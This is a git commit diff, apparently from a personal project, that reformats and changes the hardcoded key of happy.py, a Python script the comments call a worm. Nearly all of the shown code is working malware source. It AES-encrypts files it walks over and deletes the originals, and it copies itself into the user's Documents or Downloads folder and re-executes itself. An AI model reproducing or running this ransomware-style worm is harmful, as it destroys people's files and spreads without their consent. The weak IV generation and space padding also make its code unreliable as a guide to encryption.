4fecdee8b03a728888bd1134b65f48b874145385
Brandon Hinds <brandonhinds13@gmail.com>
2017-03-06 14:09:06 -0500

    happy indentations

--- happy.py
+++ happy.py
@@ -10,30 +10,28 @@ from shutil import copyfile
 
 
 def encrypt(key, filename):
-        chunksize = 64 * 1024
-        outFile = os.path.join(os.path.dirname(filename), "(encrypted)"+os.path.basename(filename))
-        filesize = str(os.path.getsize(filename)).zfill(16)
-        IV = ''
- 
-        for i in range(16):
-                IV += chr(random.randint(0, 0xFF))
-       
-        encryptor = AES.new(key, AES.MODE_CBC, IV)
- 
-        with open(filename, "rb") as infile:
-                with open(outFile, "wb") as outfile:
-                        outfile.write(filesize)
-                        outfile.write(IV)
-                        while True:
-                                chunk = infile.read(chunksize)
-                               
-                                if len(chunk) == 0:
-                                        break
- 
-                                elif len(chunk) % 16 !=0:
-                                        chunk += ' ' *  (16 - (len(chunk) % 16))
+    chunksize = 64 * 1024
+    outFile = os.path.join(os.path.dirname(filename), "(encrypted)"+os.path.basename(filename))
+    filesize = str(os.path.getsize(filename)).zfill(16)
+    IV = ''
 
-                                outfile.write(encryptor.encrypt(chunk))
+    for i in range(16):
+        IV += chr(random.randint(0, 0xFF))
+
+    encryptor = AES.new(key, AES.MODE_CBC, IV)
+
+    with open(filename, "rb") as infile:
+        with open(outFile, "wb") as outfile:
+            outfile.write(filesize)
+            outfile.write(IV)
+            while True:
+                chunk = infile.read(chunksize)
+                if len(chunk) == 0:
+                    break
+                elif len(chunk) % 16 !=0:
+                    chunk += ' ' *  (16 - (len(chunk) % 16))
+
+                outfile.write(encryptor.encrypt(chunk))
 
 
 def allfiles():
@@ -45,7 +43,7 @@ def allfiles():
         return allFiles
  
 def action():
-        password = "QEWJR3OIR2YUD92128!$##%$^*(093URO3DMKMXS,NCFJVHBHDUWQDHUDHQ9jswdhgehydxbhwqdbwyhfc" #This is the key
+        password = "GKDY<YSKU>546K61I61*1&1461Y;uo4984lfeuoliykilylisylul3l4LUOULDULUOujreluflutfk.5;/5hh565dc" #This is the key
         encFiles = allfiles()
         for Tfiles in encFiles:
                 if os.path.basename(Tfiles).startswith("(encrypted)"):
@@ -60,24 +58,25 @@ def action():
                         os.remove(Tfiles)
 
 def rep():
-	source=os.path.abspath("happy.py")
-	user=getpass.getuser()
-	if(os.path.isdir("/home/"+user+"/Documents/")):
-		destination="/home/"+user+"/Documents/"+"happy.py"
-	elif(os.path.isdir("/home/"+user+"/Downloads/")):
-		destination="/home/"+user+"/Downloads/"+"happy.py"
-	else:
-		destination=os.getcwd()+"\\worm.py" 
+    source=os.path.abspath("happy.py")
+    user=getpass.getuser()
+    if(os.path.isdir("/home/"+user+"/Documents/")):
+        destination="/home/"+user+"/Documents/"+"happy.py"
+    elif(os.path.isdir("/home/"+user+"/Downloads/")):
+        destination="/home/"+user+"/Downloads/"+"happy.py"
+    else:
+        destination=os.getcwd()+"\\worm.py" 
 
-	copyfile(source,destination)
-        os.system("python "+destination) # To execute script
+    copyfile(source,destination)
+    os.system("python "+destination) # To execute script
 
-	#print "Current location of worm: " + destination
-	#print "Original location of worm: "+ source
+
+    #print "Current location of worm: " + destination
+    #print "Original location of worm: "+ source
 
 def main():
-        rep()
-	action()
+    rep()
+    action()
 
 if __name__=="__main__":
-	main()
+    main()
